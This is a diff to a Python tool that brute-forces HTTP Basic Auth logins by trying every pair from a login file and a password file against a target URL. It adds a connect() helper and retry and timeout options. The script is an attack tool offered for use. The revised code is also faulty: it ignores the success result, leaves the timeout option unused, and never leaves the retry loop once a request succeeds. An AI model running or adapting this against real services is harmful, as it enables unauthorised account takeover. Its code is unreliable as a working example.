@@ -1,17 +1,29 @@
-import socket
-
 __author__ = 'mwitas'
 import argparse
 import os.path
 import sys
+import socket
 import requests.auth
 import requests.exceptions
+
+def connect(url, login, password, timeout):
+    from requests.auth import HTTPBasicAuth
+
+    try:
+        r = requests.get(url, auth=HTTPBasicAuth(login, password), timeout=timeout, stream=True)
+        r.close()
+        return r.status_code
+
+    except (requests.exceptions.ConnectionError, socket.timeout, requests.exceptions.ReadTimeout) as e:
+        raise requests.exceptions.ConnectionError("Connection timeout")
 
 
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("logins", help="File with logins. Every login in new line")
     parser.add_argument("passwords", help="File with passwords. Every password in new line")
+    parser.add_argument("-r", dest="retry", help="Retry on connection error", action="store_true")
+    parser.add_argument("-t", dest="timeout", help="Connection timeout in seconds", type=int, default=5)
     parser.add_argument("url", help="URL of endpoint to brute force")
     args = parser.parse_args()
 
@@ -38,7 +50,6 @@ def main():
     d_logins = open(f_logins)
     d_passwords = open(f_passwords)
 
-    from requests.auth import HTTPBasicAuth
 
     for i, line in enumerate(d_logins):
         login = line[:-1]
@@ -46,26 +57,15 @@ def main():
         for j, line2 in enumerate(d_passwords):
             password = line2[:-1]
 
-            head = str(i*n_logins+j+1) + "/" + str(n_logins*n_passwords) + "\t" + login + ":" + password + "\t"
+            head = str(i*n_passwords+j+1) + "/" + str(n_logins*n_passwords) + "\t" + login + ":" + password + "\t"
 
-            try:
-                r = requests.get(url, auth=HTTPBasicAuth(login, password), timeout=5, stream=True)
-
-                if r.status_code == 200:
-                    s = "Found valid pair - " + login + ":" + password
-                    print(s)
-                    should_exit = True
-                    break
-
-                s = head + str(r.status_code)
-                print(s)
-
-                r.close()
-            except requests.exceptions.ConnectionError:
-                print(head + "Connection timeout")
-
-        if should_exit:
-            break
+            should_retry = True
+            while should_retry:
+                try:
+                    connect(url, login, password, 3)
+                except requests.exceptions.ConnectionError:
+                    print(head + "Connection error")
+                    should_retry = args.retry
 
         d_passwords.seek(0)
 
